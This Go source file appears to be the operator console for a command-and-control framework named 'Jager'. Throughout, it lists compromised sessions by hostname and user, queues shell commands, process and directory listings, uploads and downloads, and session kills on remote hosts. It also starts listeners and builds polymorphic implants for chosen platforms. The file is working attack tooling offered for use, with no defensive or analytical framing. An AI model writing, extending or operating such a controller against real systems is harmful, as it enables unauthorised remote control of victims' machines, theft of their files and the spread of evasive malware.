package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

func mgmtURL() string {
	if u := os.Getenv("JAGER_MGMT_URL"); u != "" {
		return strings.TrimRight(u, "/")
	}
	return "http://127.0.0.1:31338"
}

func mgmtGet(path string) ([]byte, error) {
	req, err := http.NewRequest(http.MethodGet, mgmtURL()+path, nil)
	if err != nil {
		return nil, err
	}
	if key := os.Getenv("JAGER_MGMT_API_KEY"); key != "" {
		req.Header.Set("X-Jager-C2-Api-Key", key)
	}
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return body, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	return body, err
}

func mgmtPost(path string, payload any) ([]byte, error) {
	b, _ := json.Marshal(payload)
	req, err := http.NewRequest(http.MethodPost, mgmtURL()+path, strings.NewReader(string(b)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	if key := os.Getenv("JAGER_MGMT_API_KEY"); key != "" {
		req.Header.Set("X-Jager-C2-Api-Key", key)
	}
	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return body, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	return body, err
}

func listSessions() error {
	body, err := mgmtGet("/mgmt/sessions")
	if err != nil {
		return err
	}
	var out struct {
		Sessions []map[string]interface{} `json:"sessions"`
	}
	if err := json.Unmarshal(body, &out); err != nil {
		return err
	}
	fmt.Printf("%-36s %-16s %-20s\n", "ID", "HOSTNAME", "USER")
	fmt.Printf("%-36s %-16s %-20s\n", "--", "--------", "----")
	for _, s := range out.Sessions {
		reg, _ := s["registration"].(map[string]interface{})
		id, _ := s["id"].(string)
		host, _ := reg["hostname"].(string)
		user, _ := reg["username"].(string)
		fmt.Printf("%-36s %-16s %-20s\n", id, host, user)
	}
	return nil
}

func queueShell(sessionID, command string) error {
	body, err := mgmtPost("/mgmt/task", map[string]interface{}{
		"session_id": sessionID,
		"type":       10,
		"data":       command,
	})
	if err != nil {
		return err
	}
	var out map[string]interface{}
	_ = json.Unmarshal(body, &out)
	fmt.Println(string(body))
	taskID, _ := out["task_id"].(string)
	if taskID == "" {
		return nil
	}
	waitBody, err := mgmtGet("/mgmt/task/wait?task_id=" + taskID)
	if err != nil {
		return err
	}
	fmt.Println(string(waitBody))
	return nil
}

func interactSession(sessionID string) error {
	fmt.Printf("[*] Interacting with session: %s\n", sessionID)
	fmt.Println("[*] Type 'help' for commands, 'back' or 'exit' to return")
	fmt.Println()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("(%s) > ", sessionID[:8])
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		switch {
		case line == "back" || line == "exit":
			fmt.Println("[*] Returning to main menu")
			return nil
		case line == "help":
			fmt.Println("  shell <cmd>     - Execute shell command")
			fmt.Println("  ps              - List processes")
			fmt.Println("  ls [path]       - List directory")
			fmt.Println("  upload <l> <r>  - Upload file")
			fmt.Println("  download <r>    - Download file")
			fmt.Println("  sleep <sec>     - Set sleep interval")
			fmt.Println("  info            - Session info")
			fmt.Println("  kill            - Terminate session")
			fmt.Println("  back/exit       - Return to menu")
		case strings.HasPrefix(line, "shell "):
			cmd := strings.TrimPrefix(line, "shell ")
			if err := queueShell(sessionID, cmd); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}
		case line == "ps":
			if err := queueTask(sessionID, 40, ""); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}
		case strings.HasPrefix(line, "ls"):
			path := strings.TrimSpace(strings.TrimPrefix(line, "ls"))
			if path == "" {
				path = "."
			}
			if err := queueTask(sessionID, 20, path); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}
		case line == "info":
			body, err := mgmtGet("/mgmt/sessions")
			if err != nil {
				fmt.Printf("[-] Error: %v\n", err)
				continue
			}
			fmt.Println(string(body))
		case line == "kill":
			return killSession(sessionID)
		case strings.HasPrefix(line, "sleep "):
			secs := strings.TrimPrefix(line, "sleep ")
			if err := queueTask(sessionID, 1, secs); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			} else {
				fmt.Printf("[+] Sleep set to %s seconds\n", secs)
			}
		default:
			if err := queueShell(sessionID, line); err != nil {
				fmt.Printf("[-] Error: %v\n", err)
			}
		}
	}
	return nil
}

func queueTask(sessionID string, taskType int, data string) error {
	body, err := mgmtPost("/mgmt/task", map[string]interface{}{
		"session_id": sessionID,
		"type":       taskType,
		"data":       data,
	})
	if err != nil {
		return err
	}
	var out map[string]interface{}
	_ = json.Unmarshal(body, &out)
	taskID, _ := out["task_id"].(string)
	if taskID == "" {
		fmt.Println(string(body))
		return nil
	}
	waitBody, err := mgmtGet("/mgmt/task/wait?task_id=" + taskID)
	if err != nil {
		return err
	}
	var result map[string]interface{}
	if json.Unmarshal(waitBody, &result) == nil {
		if output, ok := result["output"].(string); ok {
			fmt.Println(output)
		} else {
			fmt.Println(string(waitBody))
		}
	} else {
		fmt.Println(string(waitBody))
	}
	return nil
}

func killSession(sessionID string) error {
	body, err := mgmtPost("/mgmt/session/kill", map[string]interface{}{
		"session_id": sessionID,
	})
	if err != nil {
		return fmt.Errorf("kill session: %w", err)
	}
	var out map[string]interface{}
	_ = json.Unmarshal(body, &out)
	if status, ok := out["status"].(string); ok && status == "ok" {
		fmt.Printf("[+] Session %s terminated\n", sessionID)
	} else {
		fmt.Printf("[*] Response: %s\n", string(body))
	}
	return nil
}

func createListener(name, transport, host string, port int) error {
	if name == "" {
		name = fmt.Sprintf("%s-%d", transport, port)
	}
	body, err := mgmtPost("/mgmt/listener/start", map[string]interface{}{
		"name":      name,
		"transport": transport,
		"host":      host,
		"port":      port,
	})
	if err != nil {
		return fmt.Errorf("create listener: %w", err)
	}
	var out map[string]interface{}
	_ = json.Unmarshal(body, &out)
	if id, ok := out["id"].(string); ok {
		fmt.Printf("[+] Listener created: %s (%s on %s:%d)\n", id, transport, host, port)
	} else {
		fmt.Printf("[*] Response: %s\n", string(body))
	}
	return nil
}

func buildImplant(listener, osTarget, arch, format, profile, output string) error {
	fmt.Printf("[*] Building implant...\n")
	fmt.Printf("    Listener: %s\n", listener)
	fmt.Printf("    OS/Arch:  %s/%s\n", osTarget, arch)
	fmt.Printf("    Format:   %s\n", format)
	fmt.Printf("    Profile:  %s\n", profile)

	body, err := mgmtPost("/mgmt/build", map[string]interface{}{
		"listener_id":      listener,
		"os":               osTarget,
		"arch":             arch,
		"output_format":    format,
		"profile_template": profile,
		"polymorphic":      true,
	})
	if err != nil {
		return fmt.Errorf("build implant: %w", err)
	}

	var out map[string]interface{}
	_ = json.Unmarshal(body, &out)

	buildID, _ := out["build_id"].(string)
	path, _ := out["path"].(string)
	sha256, _ := out["sha256"].(string)

	if buildID != "" {
		fmt.Printf("[+] Build complete: %s\n", buildID)
		if path != "" {
			fmt.Printf("    Path:   %s\n", path)
		}
		if sha256 != "" {
			fmt.Printf("    SHA256: %s\n", sha256)
		}
	} else {
		fmt.Printf("[*] Response: %s\n", string(body))
	}

	if output != "" && path != "" {
		src, err := os.ReadFile(path)
		if err != nil {
			return fmt.Errorf("read build artifact: %w", err)
		}
		if err := os.WriteFile(output, src, 0755); err != nil {
			return fmt.Errorf("write output: %w", err)
		}
		fmt.Printf("[+] Written to: %s\n", output)
	}

	return nil
}
